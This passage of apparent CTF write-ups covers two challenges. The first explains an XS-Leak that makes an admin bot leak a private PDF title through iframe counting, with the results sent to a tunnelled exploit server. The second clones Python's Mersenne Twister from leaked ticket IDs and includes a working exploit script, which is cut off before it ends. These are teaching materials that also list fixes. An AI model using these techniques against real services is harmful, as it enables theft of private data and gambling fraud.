Private data + Search + Admin bot + User-controlled URL
```

Analogi:

> Kalau sebuah perpustakaan punya rak buku pribadi, fitur pencarian, dan robot penjaga yang mau kita suruh membuka alamat tertentu, maka kita harus curiga robot itu bisa dipakai untuk mencari buku yang sebenarnya tidak boleh kita lihat.

---

# 4. Phase 2 — Source Code Review

## 4.1 Tujuan Membaca Source Code

Karena challenge menyediakan source, kita gunakan source sebagai “peta”.

Mindset-nya:

```text
Jangan menebak-nebak kalau source tersedia.
Cari di mana flag disimpan.
Cari bagaimana akses control bekerja.
Cari route yang berhubungan dengan search dan report.
Cari perilaku bot.
```

Analogi:

> Kalau kamu mau mencari harta karun di rumah besar, source code itu seperti denah rumah. Jangan langsung dobrak pintu; baca denah dulu.

---

## 4.2 Temuan Penting: Flag Disimpan sebagai PDF Title

Di source, ditemukan seeding data admin kira-kira seperti ini:

```php
$stored_filename = 'admin_seed.pdf';
$original_filename = ADMIN_UPLOAD_FILENAME;
$title = FLAG;
$is_public = 0;
```

Maknanya:

```text
Admin punya PDF bawaan
PDF itu private
Nama file aslinya admin-private.pdf
Title PDF tersebut adalah flag
```

Ini adalah insight paling penting.

Kita tidak perlu membaca file PDF. Kita cukup mencari cara agar title PDF admin muncul atau bisa ditebak.

Analogi:

> Kita kira rahasianya ada di dalam buku. Ternyata rahasianya ditulis besar-besar di cover buku. Masalahnya, buku itu ada di rak pribadi admin.

Checkpoint:

```text
FLAG location identified:
Admin private PDF title
```

---

# 5. Phase 3 — Search Behavior Analysis

## 5.1 Memahami `/search`

Route `/search?q=...` mencari PDF berdasarkan metadata seperti title atau filename.

Yang penting, jika ada hasil search, halaman menampilkan PDF result dan membuat iframe:

```html
<iframe src="/pdfs/<id>/raw"></iframe>
```

Artinya:

```text
Kalau search cocok → ada iframe
Kalau search tidak cocok → tidak ada iframe
```

Ini menjadi dasar leak.

Analogi:

> Kalau perpustakaan menemukan buku yang dicari, dia membuka satu jendela preview buku. Kalau tidak menemukan buku, tidak ada jendela preview.

---

## 5.2 Kenapa Search Ini Berbahaya?

Search dilakukan berdasarkan data PDF, termasuk title. Karena title PDF admin adalah flag, maka query seperti ini akan cocok:

```text
/search?q=CBC{
```

Kalau admin yang membuka halaman itu, PDF private admin akan ikut masuk hasil pencarian.

Namun user biasa tidak bisa melihat hasil private admin.

Jadi masalahnya:

```text
Kita butuh admin yang membuka search tersebut
```

Dan fitur `/report` memberikan jalan ke sana.

---

# 6. Phase 4 — Admin Bot and Report Feature

## 6.1 Apa Fungsi `/report`?

Fitur report memungkinkan user mengirim URL. Kemudian admin bot akan membuka URL tersebut.

Mindset ketika melihat fitur report:

```text
Apakah bot login sebagai admin?
Apakah bot membawa cookie/session admin?
Apakah bot bisa mengakses private resource?
Apakah halaman kita bisa membuat bot membuka URL internal?
```

Pada challenge ini, admin bot membuka aplikasi dari sisi internal sebagai:

```text
http://localhost:5000
```

Ini penting.

Bagi browser admin bot:

```text
http://localhost:5000 = aplikasi Wonder PDFs
```

Bagi laptop kita:

```text
localhost = laptop kita sendiri
```

Analogi:

> “Rumahku” tergantung siapa yang ngomong. Kalau admin bot bilang localhost, itu rumah admin bot sendiri, bukan rumah kita.

---

# 7. Phase 5 — Vulnerability: XS-Leak via Frame Counting

## 7.1 Apa Itu XS-Leak?

XS-Leak adalah teknik untuk mendapatkan informasi dari halaman cross-origin tanpa membaca isi halaman secara langsung.

Browser melarang halaman kita membaca isi halaman target karena Same-Origin Policy.

Kita tidak bisa melakukan ini:

```js
popup.document.body.innerText
```

Karena beda origin.

Tapi ada beberapa efek samping yang kadang bisa diukur, misalnya:

```text
Apakah popup punya iframe?
Berapa banyak frame di halaman?
Apakah halaman redirect?
Apakah waktu load berbeda?
```

Pada challenge ini, efek sampingnya adalah:

```js
popup.length
```

Jika halaman search punya iframe, maka:

```text
popup.length > 0
```

Jika tidak ada hasil search:

```text
popup.length == 0
```

Analogi:

> Kita tidak boleh masuk rumah admin dan membaca dokumen di meja. Tapi kita bisa lihat dari luar apakah lampu kamar menyala. Lampu menyala berarti tebakan kita benar.

---

## 7.2 Kenapa `popup.length` Bisa Jadi Oracle?

Halaman search membuat iframe untuk setiap PDF result.

Jadi:

```text
Query cocok dengan title admin → result muncul → iframe dibuat → popup.length > 0
Query tidak cocok → tidak ada result → tidak ada iframe → popup.length == 0
```

Ini disebut oracle.

Oracle adalah mekanisme yang menjawab pertanyaan “iya” atau “tidak”.

Dalam challenge ini, oracle kita menjawab:

```text
Apakah query ini cocok dengan title PDF admin?
```

Contoh:

```text
Query: CBC{
Jawaban: iya

Query: CBC{a
Jawaban: tidak

Query: CBC{4
Jawaban: iya
```

Dari jawaban iya/tidak ini, kita susun flag satu karakter demi satu karakter.

---

# 8. Phase 6 — Exploitation Strategy

## 8.1 Strategi Besar

Karena flag adalah title PDF admin, dan search memakai matching seperti `LIKE`, kita bisa brute-force prefix.

Misalnya kita tahu flag dimulai dengan:

```text
CBC{
```

Lalu kita coba karakter berikutnya:

```text
CBC{a
CBC{b
CBC{c
...
CBC{4
```

Jika `CBC{4` menghasilkan iframe, maka karakter berikutnya adalah `4`.

Kemudian lanjut:

```text
CBC{4a
CBC{4b
CBC{4c
...
CBC{4e
```

Jika `CBC{4e` cocok, lanjut lagi.

Ini dilakukan sampai menemukan:

```text
}
```

Analogi:

> Seperti menebak PIN panjang. Setiap kali satu digit benar, mesin memberi tanda kecil. Kita pakai tanda kecil itu untuk membangun PIN lengkap dari kiri ke kanan.

---

# 9. Phase 7 — Infrastructure: Local Exploit Server + Tunnel

## 9.1 Kenapa Perlu Server Lokal?

Kita perlu menyediakan halaman exploit yang akan dibuka admin bot.

Script Python membuat server lokal:

```text
http://127.0.0.1:8000/attack
```

Tapi admin bot di server CTF tidak bisa membuka `127.0.0.1` laptop kita.

Maka kita expose dengan Cloudflare Tunnel:

```bash
cloudflared tunnel --url http://127.0.0.1:8000
```

Contoh URL publik:

```text
https://national-opponent-garden-remaining.trycloudflare.com
```

URL yang dikirim ke report:

```text
https://national-opponent-garden-remaining.trycloudflare.com/attack
```

Analogi:

> Server Python di laptop kita itu seperti rumah di gang kecil. Cloudflare Tunnel membuat alamat besar di jalan raya supaya admin bot bisa datang.

---

# 10. Phase 8 — Execution

## 10.1 Menjalankan Exploit Server

Command:

```bash
python3 wonder_xsleak_exploit_server.py
```

Output:

```text
[+] Serving exploit page on http://0.0.0.0:8000/attack
[+] Expose it, then submit the public /attack URL to Wonder PDFs /report
[+] State file: wonder_state.json  (open /reset to clear)
```

Artinya server exploit siap menerima bot.

---

## 10.2 Menjalankan Tunnel

Command:

```bash
cloudflared tunnel --url http://127.0.0.1:8000
```

Cloudflare memberi URL publik:

```text
https://national-opponent-garden-remaining.trycloudflare.com
```

Kemudian kita submit ke `/report`:

```text
https://national-opponent-garden-remaining.trycloudflare.com/attack
```

---

# 11. Phase 9 — Output Analysis

Output exploit:

```text
[bot] [*] checking target http://localhost:5000
[bot] [+] oracle works on http://localhost:5000
```

Artinya:

```text
Admin bot berhasil membuka halaman kita
Browser admin bisa mengakses aplikasi internal di localhost:5000
Oracle iframe-counting berhasil
```

Ini checkpoint emas.

Kemudian:

```text
[bot] [*] trying prefix CBC{
[bot] [+] prefix = CBC{
```

Artinya prefix flag adalah:

```text
CBC{
```

Lalu proses extraction:

```text
[bot] [+] CBC{4
[bot] [+] CBC{4e
[bot] [+] CBC{4ef
[bot] [+] CBC{4efd
...
```

Ini berarti script berhasil menebak flag satu karakter demi satu karakter.

---

# 12. Kenapa Ada “Time Limit Reached”?

Output:

```text
[bot] [*] time limit reached; report /attack again to continue from: CBC{4efd3d
```

Ini bukan error.

Admin bot hanya membuka halaman kita selama waktu terbatas. Script sengaja berhenti sebelum waktu habis dan menyimpan progress ke:

```text
wonder_state.json
```

Kemudian kita submit ulang URL `/attack`, dan script melanjutkan dari prefix terakhir.

Analogi:

> Admin bot seperti kurir yang cuma boleh mampir sebentar. Sekali mampir dia bantu tebak beberapa huruf. Setelah itu pergi. Kita panggil lagi, dia lanjut dari catatan terakhir.

Checkpoint progress:

```text
Run 1: CBC{4efd3d
Run 2: CBC{4efd3d8c2a63
Run 3: CBC{4efd3d8c2a6358493c
Run 4: CBC{4efd3d8c2a6358493c484bde
Run 5: CBC{4efd3d8c2a6358493c484bdeb1e31d
Run 6: CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

Final:

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

---

# 13. Python Exploit Dissection

## 13.1 Role Script Python

Script Python bukan langsung “membobol server”. Perannya adalah:

```text
Membuat server kecil
Menyediakan halaman /attack
Menerima log dari browser admin bot
Menyimpan progress flag
Melanjutkan extraction ketika bot datang lagi
```

Analogi:

> Script Python adalah posko. Admin bot datang ke posko, membaca instruksi, menjalankan tugas, lalu mengirim kabar balik ke posko.

---

## 13.2 Library yang Dipakai

Script memakai library bawaan Python:

```python
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs
import json
import os
import time
```

Penjelasan:

```text
http.server     → membuat web server kecil
urllib.parse    → membaca query string seperti /progress?prefix=...
json            → menyimpan progress ke file JSON
os              → cek file, environment variable, hapus state
time            → mencatat waktu update
```

Kenapa tidak pakai Flask?

Karena kebutuhan kita sederhana. Server hanya perlu beberapa endpoint:

```text
/attack
/state
/progress
/log
/reset
```

Analogi:

> Kita cuma butuh warung kecil, bukan restoran besar. Library bawaan Python sudah cukup.

---

## 13.3 Konfigurasi Server

```python
HOST = "0.0.0.0"
PORT = 8000
STATE_FILE = "wonder_state.json"
```

Maknanya:

```text
0.0.0.0              → menerima koneksi dari interface jaringan yang tersedia
8000                 → port server lokal
wonder_state.json    → file penyimpanan progress
```

Kenapa penting?

Karena Cloudflare Tunnel akan meneruskan traffic publik ke server lokal port 8000.

---

## 13.4 State Management

State menyimpan progress:

```json
{
  "prefix": "CBC{4efd3d",
  "target": "http://localhost:5000",
  "done": false,
  "updated_at": 1234567890
}
```

Tujuannya:

```text
Kalau bot timeout, progress tidak hilang
Ketika /attack disubmit ulang, script lanjut dari prefix terakhir
```

Analogi:

> Ini seperti bookmark buku. Kalau waktu baca habis, kamu tidak mulai dari halaman pertama lagi.

---

## 13.5 Endpoint `/attack`

Endpoint ini mengirim halaman HTML/JavaScript exploit ke admin bot.

Flow:

```text
Admin bot membuka /attack
Python mengirim HTML exploit
JavaScript berjalan di browser admin
JavaScript mulai melakukan XS-Leak
```

Analogi:

> Admin datang ke posko. Kita kasih kertas instruksi. Admin membaca instruksi itu dan menjalankannya di browser admin.

---

## 13.6 Endpoint `/log`

Browser admin mengirim log ke server Python:

```text
/log?msg=[+] CBC{4e
```

Python mencetaknya di terminal:

```text
[bot] [+] CBC{4e
```

Fungsinya agar kita bisa melihat progress secara real-time.

---

## 13.7 Endpoint `/progress`

Browser admin mengirim prefix terbaru:

```text
/progress?prefix=CBC{4efd3d8c2a63&target=http://localhost:5000
```

Python menyimpan prefix tersebut ke `wonder_state.json`.

Ada validasi penting:

```text
Hanya simpan prefix kalau panjangnya tidak lebih pendek dari progress sebelumnya
```

Kenapa?

Supaya progress tidak mundur.

Analogi:

> Kalau catatan terakhir sudah sampai halaman 20, jangan sampai ditimpa dengan catatan lama halaman 10.

---

## 13.8 Endpoint `/state`

Saat bot datang lagi, JavaScript bertanya ke Python:

```text
/state
```

Python menjawab:

```json
{
  "prefix": "CBC{4efd3d8c2a63",
  "target": "http://localhost:5000",
  "done": false
}
```

Jadi JavaScript tahu harus lanjut dari mana.

---

## 13.9 Endpoint `/reset`

Endpoint ini menghapus state.

Dipakai hanya kalau:

```text
Prefix salah
Target salah
Mau mulai ulang
State corrupt
```

Saat extraction sudah benar, jangan reset.

---

# 14. JavaScript Exploit Logic

Bagian paling penting ada di halaman `/attack`.

## 14.1 Target Selection

Script mencoba target:

```text
http://localhost:5000
https://wonder.cbd2026.cloud
```

Kenapa `localhost:5000`?

Karena dari sisi admin bot, aplikasi berjalan internal di sana.

Script melakukan test dengan query yang diketahui:

```text
admin-private.pdf
```

Jika query ini menghasilkan iframe, oracle bekerja.

Output:

```text
[bot] [+] oracle works on http://localhost:5000
```

Maknanya:

```text
Target valid
Admin session aktif
Search bisa dipakai sebagai oracle
```

---

## 14.2 Prefix Detection

Script mencoba prefix umum:

```text
CBC{
FLAG{
CBD{
CTF{
```

Saat `CBC{` menghasilkan iframe:

```text
[bot] [+] prefix = CBC{
```

Berarti flag dimulai dengan `CBC{`.

Backup plan jika prefix tidak cocok:

```text
Tambahkan prefix lain sesuai format kompetisi
Cek source/env challenge
Cek platform CTF biasanya pakai format apa
```

Dalam kasus ini, kita menambahkan:

```text
CBC{
```

---

## 14.3 Character Extraction

Untuk setiap prefix, script mencoba kandidat karakter berikutnya.

Misalnya prefix sekarang:

```text
CBC{4efd3d
```

Script mencoba:

```text
CBC{4efd3da
CBC{4efd3db
CBC{4efd3dc
...
CBC{4efd3d8
```

Jika hanya `CBC{4efd3d8` yang menghasilkan iframe, maka karakter berikutnya adalah:

```text
8
```

Lalu prefix menjadi:

```text
CBC{4efd3d8
```

Proses ini berulang sampai `}`.

---

# 15. Backup Plan and Pivot Thinking

Dalam proses eksploitasi, ada beberapa kemungkinan gagal. Cara berpikir pivot-nya seperti ini.

## 15.1 Kalau `/report` Tidak Mengunjungi URL Kita

Kemungkinan:

```text
Tunnel mati
URL salah
Endpoint /attack salah
Bot memblokir HTTPS tertentu
Server Python tidak jalan
```

Solusi:

```text
Cek terminal Python
Cek terminal cloudflared
curl URL /attack
Pastikan submit URL lengkap dengan /attack
```

---

## 15.2 Kalau Oracle Tidak Bekerja

Kemungkinan:

```text
Target internal bukan localhost:5000
Admin bot tidak login
Search tidak menghasilkan iframe
Delay popup terlalu cepat
Browser bot memblokir popup
```

Pivot:

```text
Coba target public https://wonder.cbd2026.cloud
Naikkan delay loading
Cari endpoint lain yang menghasilkan perbedaan terukur
Cari redirect/timing/resource load leak
```

---

## 15.3 Kalau Prefix Tidak Cocok

Kemungkinan:

```text
Format flag bukan FLAG{
Prefix kompetisi berbeda
Case-sensitive
Title bukan flag langsung
```

Pivot:

```text
Tambahkan CBC{
Tambahkan prefix lain
Cek challenge lain dari kompetisi yang sama
Cek env/source untuk format flag
```

Dalam kasus ini, prefix benar adalah:

```text
CBC{
```

---

## 15.4 Kalau Extraction Berhenti di Tengah

Kemungkinan:

```text
Time limit bot habis
Progress belum selesai
State tersimpan
```

Solusi:

```text
Submit ulang /attack
Jangan reset wonder_state.json
Lanjutkan sampai ketemu }
```

Ini yang terjadi pada challenge kita.

---

# 16. Timeline Eksploitasi Berdasarkan Output

## Run Pertama

```text
[bot] [+] oracle works on http://localhost:5000
[bot] [+] prefix = CBC{
[bot] [+] CBC{4
[bot] [+] CBC{4e
[bot] [+] CBC{4ef
[bot] [+] CBC{4efd
[bot] [+] CBC{4efd3
[bot] [+] CBC{4efd3d
[bot] [*] time limit reached
```

Progress:

```text
CBC{4efd3d
```

## Run Kedua

```text
[bot] [*] starting from: CBC{4efd3d
[bot] [+] CBC{4efd3d8
[bot] [+] CBC{4efd3d8c
[bot] [+] CBC{4efd3d8c2
[bot] [+] CBC{4efd3d8c2a
[bot] [+] CBC{4efd3d8c2a6
[bot] [+] CBC{4efd3d8c2a63
```

Progress:

```text
CBC{4efd3d8c2a63
```

## Run Ketiga

```text
CBC{4efd3d8c2a6358493c
```

## Run Keempat

```text
CBC{4efd3d8c2a6358493c484bde
```

## Run Kelima

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d
```

## Run Keenam

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

Final:

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

---

# 17. Root Cause

Root cause challenge ini adalah kombinasi beberapa kelemahan desain:

```text
Sensitive data disimpan di searchable metadata
Private admin data bisa dicari oleh admin session
Search result membuat struktur DOM berbeda ketika ada hasil
Admin bot membuka user-controlled URL
Tidak ada mitigasi terhadap XS-Leak
```

Secara individual, fitur-fitur ini mungkin terlihat normal. Tetapi saat digabung, mereka membentuk exploit chain.

Analogi:

> Satu lubang kecil di pagar mungkin tidak bahaya. Satu tangga kecil juga tidak bahaya. Satu jendela terbuka juga tidak bahaya. Tapi kalau pagar berlubang, ada tangga, dan jendela terbuka, orang bisa masuk.

---

# 18. Security Impact

Dampaknya:

```text
Attacker bisa mengekstrak private metadata milik admin
Attacker tidak perlu membaca halaman admin secara langsung
Attacker cukup menggunakan browser admin sebagai oracle
Sensitive information leaked melalui side-channel
```

Dalam real-world application, pola seperti ini bisa membocorkan:

```text
Nama dokumen rahasia
Judul file private
Email internal
Status transaksi
Keberadaan record tertentu
Token atau identifier yang searchable
```

---

# 19. Recommended Fixes

## 19.1 Jangan Simpan Secret di Searchable Metadata

Flag atau secret tidak seharusnya disimpan sebagai title searchable.

Best practice:

```text
Pisahkan sensitive data dari metadata yang bisa dicari
Jangan jadikan secret sebagai title, filename, atau label
```

---

## 19.2 Batasi Search Berdasarkan Authorization

Search harus memastikan user hanya bisa mencari data yang memang boleh dia akses.

Untuk admin bot, hati-hati karena admin session bisa membuka data terlalu luas.

---

## 19.3 Hardening Admin Bot

Admin bot sebaiknya:

```text
Tidak memakai privileged session kecuali diperlukan
Tidak membuka arbitrary URL dengan session aktif
Menggunakan isolated browser context
Memblokir popup
Menerapkan timeout dan network restrictions
```

---

## 19.4 Mitigasi XS-Leak

Beberapa mitigasi:

```text
Cross-Origin-Opener-Policy
Cross-Origin-Resource-Policy
X-Frame-Options
Content-Security-Policy frame-ancestors
SameSite cookie
Memastikan halaman private tidak menghasilkan perbedaan struktur yang bisa diukur cross-origin
```

---

# 20. Lessons Learned

Pelajaran penting dari challenge ini:

```text
1. Jangan hanya cari bug klasik seperti SQLi atau XSS.
2. Fitur report sering berarti admin bot.
3. Admin bot bisa menjadi jembatan ke data private.
4. Same-Origin Policy mencegah membaca isi halaman, tapi tidak selalu mencegah side-channel.
5. XS-Leak sering memanfaatkan perbedaan kecil: iframe count, timing, redirect, load success/failure.
6. Brute-force tidak selalu berarti brute-force password; bisa juga brute-force informasi lewat oracle.
7. State persistence penting ketika bot punya time limit.
```

---

# 21. Final Attack Chain

Attack chain final:

```text
1. Review source code.
2. Identify that admin private PDF title contains the flag.
3. Analyze /search behavior.
4. Notice search result creates iframe when a PDF matches.
5. Identify /report admin bot behavior.
6. Host exploit page locally.
7. Expose local server via Cloudflare Tunnel.
8. Submit /attack URL to /report.
9. Admin bot opens exploit page.
10. Exploit page opens admin-side /search?q=<candidate>.
11. JavaScript checks popup.length.
12. If popup.length > 0, candidate prefix is correct.
13. Save prefix progress.
14. Repeat until closing brace.
15. Retrieve final flag.
```

---

# 22. Final Flag

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

---

# 23. Portfolio-Friendly Summary

Wonder 1000 Nyxmare was solved by chaining an admin bot report feature with an XS-Leak side channel. Source code review revealed that the flag was stored as the title of a private admin PDF. The search endpoint rendered an iframe whenever a matching PDF was found. Although browser same-origin restrictions prevented direct reading of the admin search page, the exploit page could open the search result in a popup and infer whether a match occurred by checking `popup.length`.

A Python-based exploit server was built to serve the malicious `/attack` page, receive progress logs, and persist extracted characters across multiple admin bot visits. Since the bot had a limited runtime, the extraction process was continued by repeatedly submitting the same tunnel URL to the report endpoint. The flag was recovered character by character through the search oracle.

Final recovered flag:

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

---

# 24. Versi Super Sederhana Buat Otak Nempel

Bayangin ada perpustakaan.

Admin punya buku private. Kita tidak boleh baca buku itu.

Tapi cover bukunya berisi flag.

Perpustakaan punya mesin search. Kalau hasil ditemukan, mesin membuka jendela preview.

Kita tidak bisa melihat isi search admin, tapi kita bisa tahu:

```text
Ada jendela preview atau tidak?
```

Kalau ada jendela, tebakan kita benar.

Jadi kita suruh admin bot membuka halaman kita lewat Report.

Halaman kita bilang ke browser admin:

```text
Coba cari CBC{a
Coba cari CBC{b
Coba cari CBC{c
...
```

Saat jendela muncul di `CBC{4`, kita tahu huruf berikutnya `4`.

Lalu lanjut:

```text
CBC{4e
CBC{4ef
CBC{4efd
...
```

Sampai lengkap:

```text
CBC{4efd3d8c2a6358493c484bdeb1e31d89}
```

Itulah inti challenge ini: **bukan membaca rahasia secara langsung, tapi membaca bayangan dari rahasia itu.**


## CHAT 16
# CTF WRITEUP - Starline Casino

## Information Challenge

**Challenge Name:** Starline Casino
**Category:** Crypto / PRNG Prediction
**Target:** `nc crypto.cbd2026.cloud 1337`
**Given File:** `casino.zip`
**Main Weakness:** Predictable pseudo-random number generator
**Goal:** Gain enough casino credits to buy the VIP flag.

Challenge hint:

> “Starline Casino gives every guest a private randomness stream, and every round still prints a public ticket ID for audit review.”

This sentence is the biggest clue. It tells us two things:

1. There is a private randomness stream.
2. The server prints a public ticket ID every round.

That means the game may be leaking outputs from its random generator. The earlier simplified flow also points to this same idea: collect many ticket IDs, learn the pattern, predict future roulette results, win credits, then buy the flag. 

---

# 1. Executive Summary

The casino uses Python’s `random.Random`, which is based on **MT19937 / Mersenne Twister**.

This generator is not safe for security or gambling logic because if we can see enough outputs, we can reconstruct its internal state.

The server leaks one raw 32-bit RNG output every round:

```python
ticket = rng.getrandbits(32)
print(f'ticket id: {ticket:08x}')
```

After collecting **624 ticket IDs**, we can clone the RNG state and predict future tickets.

Roulette decides the winning number like this:

```python
winning = ticket % 37
```

So once we can predict the next ticket, we can predict the next roulette number.

Final attack flow:

```text
Collect 624 ticket IDs
→ Rebuild the MT19937 state
→ Predict the next ticket
→ Calculate ticket % 37
→ Bet all credits on the predicted number
→ Win big
→ Repeat until balance >= 50000
→ Buy flag
```

---

# 2. Reconnaissance Phase

## 2.1 First Thought Process

When I see a crypto CTF involving a casino, randomness, tickets, roulette, or gambling, my first instinct is:

> “This is probably not about breaking encryption. This is probably about breaking bad randomness.”

Why?

Because casino challenges usually depend on unpredictable outcomes. If the “random” outcome can be predicted, we can force a win.

The challenge text says:

```text
private randomness stream
public ticket ID
```

That sounds suspicious.

Analogy:

Imagine a casino claims their dice roll is secret, but after every roll they also print a “receipt number” generated by the same dice machine. If that receipt number comes from the same source as the game result, the receipt becomes a leak.

So the first question is:

> “Is the public ticket ID related to the winning result?”

---

## 2.2 Inspecting the Source Code

Inside `casino.zip`, the important files are:

```text
chall.py
flag.txt
```

The local `flag.txt` is only a fake placeholder. The real flag is on the remote server.

Important constants:

```python
FLAG_PRICE = 50000
STARTING_BALANCE = 1000
```

Meaning:

```text
We start with 1000 credits.
We need 50000 credits.
We cannot buy the flag immediately.
```

So we need to win money.

---

# 3. Source Code Analysis

## 3.1 The Random Generator

The server creates one RNG for the whole session:

```python
rng = random.Random(secrets.randbits(256))
```

At first glance, this looks safe because `secrets.randbits(256)` is strong.

But the problem is subtle.

The seed is strong, but the generator is still:

```python
random.Random
```

Python’s `random.Random` uses MT19937.

MT19937 is good for simulations, games, and non-security randomness, but it is **not cryptographically secure**.

Analogy:

The casino put a very strong lock on the front door, but then left the window open.

The strong seed is the front door lock.

The leaked ticket IDs are the open window.

---

## 3.2 The Ticket Leak

The code generates tickets like this:

```python
def next_ticket(rng):
    return rng.getrandbits(32)
```

Then roulette does this:

```python
ticket = next_ticket(rng)
winning = ticket % 37
print(f'ticket id: {ticket:08x}')
```

This is the critical bug.

The server prints the exact RNG output used to calculate the game result.

So every round leaks one 32-bit output from MT19937.

Analogy:

Imagine the teacher gives an exam, but before each question, they accidentally show part of the answer key. One answer is not enough to know the whole key, but after enough leaks, we can reconstruct the pattern.

---

# 4. Vulnerability Analysis

## 4.1 What is MT19937?

MT19937, also called Mersenne Twister, is a pseudo-random number generator.

Pseudo-random means:

```text
It looks random,
but it is actually produced by a deterministic algorithm.
```

If you know the internal state, you can predict all future numbers.

Analogy:

A music playlist on shuffle may look random. But if the shuffle order was already decided, and you somehow learn the playlist order, you can predict the next song.

MT19937 has an internal state made of:

```text
624 numbers, each 32-bit
```

That is why **624 leaked outputs** are special.

If we collect 624 outputs, we can rebuild the generator’s brain.

---

## 4.2 Why 624 Tickets?

Every ticket is:

```python
rng.getrandbits(32)
```

That gives one 32-bit output.

MT19937 state size is 624 of these 32-bit values.

So:

```text
1 ticket  = 1 leaked 32-bit output
624 tickets = enough to reconstruct the full MT19937 state
```

Analogy:

Imagine the casino machine has a secret notebook with 624 pages. Each ticket lets us see one page. After seeing all 624 pages, we can copy the notebook.

Once copied, our fake machine behaves exactly like the real casino machine.

---

# 5. Exploitation Plan

## 5.1 Why Use Roulette?

There are two games:

```text
1. Roulette
2. Slots
```

Both leak ticket IDs.

But roulette is better for exploitation because its payout is larger:

```python
payout = stake * 36
```

If we can predict the winning number, roulette lets us multiply our balance quickly.

Slots only pays:

```python
payout = stake * 8
```

So roulette is the fastest path to 50000 credits.

Decision:

```text
Use roulette to collect tickets.
Then use roulette again to win big.
```

---

## 5.2 Collect Tickets Safely

We start with:

```text
Balance = 1000
```

We need 624 ticket IDs.

If we bet 1 credit each time, worst case we lose 624 credits.

```text
1000 - 624 = 376
```

So even if we lose every collection round, we still have enough balance left to exploit.

This is why the exploit uses:

```text
stake = 1
guess = 0
```

At this stage, we do not care about winning.

We only care about collecting tickets.

Analogy:

We are not playing to win yet. We are sitting at the casino table taking notes.

---

# 6. Attack Flow

## Checkpoint 1 — Connect to the Casino

Manual test:

```bash
nc crypto.cbd2026.cloud 1337
```

Expected menu:

```text
Balance: 1000 credits
1. Play roulette
2. Spin slots
3. Buy VIP flag (50000 credits)
4. Exit
>
```

Thought process:

The server is menu-based, so our exploit must send menu choices and parse the printed output.

---

## Checkpoint 2 — Play Roulette 624 Times

Each round:

```text
Choose roulette
Stake 1
Guess any number
Capture ticket id
```

Example:

```text
ticket id: a1b2c3d4
```

We convert this hex ticket into an integer.

```python
int("a1b2c3d4", 16)
```

Why hex?

Because the server prints:

```python
{ticket:08x}
```

That means 8-character lowercase hexadecimal.

---

## Checkpoint 3 — Reverse the MT19937 Tempering

MT19937 does not output its raw internal state directly.

Before outputting a number, it applies a transformation called **tempering**.

So the leaked ticket is:

```text
tempered state value
```

To rebuild the internal state, we need to reverse this process.

That reverse process is called:

```text
untemper
```

Analogy:

The ticket ID is like a folded paper. The internal state is the original flat paper. `untemper` is how we unfold it.

---

## Checkpoint 4 — Clone the RNG

After untempering all 624 ticket IDs, we create our own Python RNG:

```python
clone = random.Random()
clone.setstate((3, tuple(mt_state + [624]), None))
```

Now our local RNG is synchronized with the casino’s RNG.

Analogy:

We have built a copy of the casino’s random machine. When the real machine says the next number is X, our copied machine also says X.

---

## Checkpoint 5 — Predict the Next Roulette Number

The casino calculates roulette result using:

```python
winning = ticket % 37
```

So we do the same:

```python
predicted_ticket = clone.getrandbits(32)
guess = predicted_ticket % 37
```

Then we bet on `guess`.

This is no longer gambling.

This is prediction.

---

## Checkpoint 6 — Bet All Credits

Once we know the correct number, we can safely bet our full balance:

```python
stake = balance
```

If we win:

```python
new_balance = balance - stake + stake * 36
```

Because `stake = balance`, this becomes roughly:

```text
new_balance = balance * 36
```

Example:

```text
376 credits → 13536 credits
13536 credits → 487296 credits
```

After two wins, we easily pass 50000 credits.

---

## Checkpoint 7 — Buy the Flag

Once balance is enough:

```text
3. Buy VIP flag
```

The server prints the real flag.

---

# 7. Python Exploit Script

```python
#!/usr/bin/env python3
import random
import re
import socket
import sys

MASK = 0xffffffff
HOST = sys.argv[1] if len(sys.argv) > 1 else 'crypto.cbd2026.cloud'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

TICKET_RE = re.compile(rb'ticket id: ([0-9a-f]{8})')
BALANCE_RE = re.compile(rb'Balance: (\d+) credits')
FLAG_RE = re.compile(r'CBC\{[^}\n]+\}')


def undo_right_xor(y, shift):
    x = y
    for _ in range(10):
        x = y ^ (x >> shift)
    return x & MASK


def undo_left_xor_mask(y, shift, mask):
    x = y
    for _ in range(10):
        x = y ^ ((x << shift) & mask)
    return x & MASK


def untemper(y):
    y = undo_right_xor(y, 18)
    y = undo_left_xor_mask(y, 15, 0xefc60000)
    y = undo_left_xor_mask(y, 7, 0x9d2c5680)
    y = undo_right_xor(y, 11)
    return y & MASK


class Remote:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.settimeout(10)
        self.buf = b''
        self.recv_until(b'> ')

    def recv_until(self, marker):
        while marker not in self.buf:
            chunk = self.s.recv(65536)
            if not chunk:
                raise EOFError('connection closed')
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out

    def recv_until_ticket_count(self, n):
        data = b''
        while True:
            if self.buf:
                data += self.buf
                self.buf = b''

            if len(TICKET_RE.findall(data)) >= n and data.rstrip().endswith(b'>'):
                return data

            chunk = self.s.recv(65536)
            if not chunk:
                raise EOFError('connection closed')
            data += chunk

    def send(self, text):
        self.s.sendall(text.encode())

    def roulette(self, stake, guess):
        self.send(f'1\n{stake}\n{guess}\n')
        data = self.recv_until(b'> ')
        ticket = int(TICKET_RE.search(data).group(1), 16)
        balance = int(BALANCE_RE.findall(data)[-1])
        return ticket, balance, data

    def buy_flag(self):
        self.send('3\n')
        try:
            return self.s.recv(65536).decode(errors='replace')
        except socket.timeout:
            return ''


def main():
    r = Remote(HOST, PORT)

    print('[+] collecting 624 public tickets...', file=sys.stderr)

    r.send('1\n1\n0\n' * 624)
    data = r.recv_until_ticket_count(624)

    tickets = [int(x, 16) for x in TICKET_RE.findall(data)[:624]]
    balance = int(BALANCE_RE.findall(data)[-1])

    print(f'[+] collected={len(tickets)}, balance={balance}', file=sys.stderr)

    mt_state = [untemper(t) for t in tickets]

    clone = random.Random()
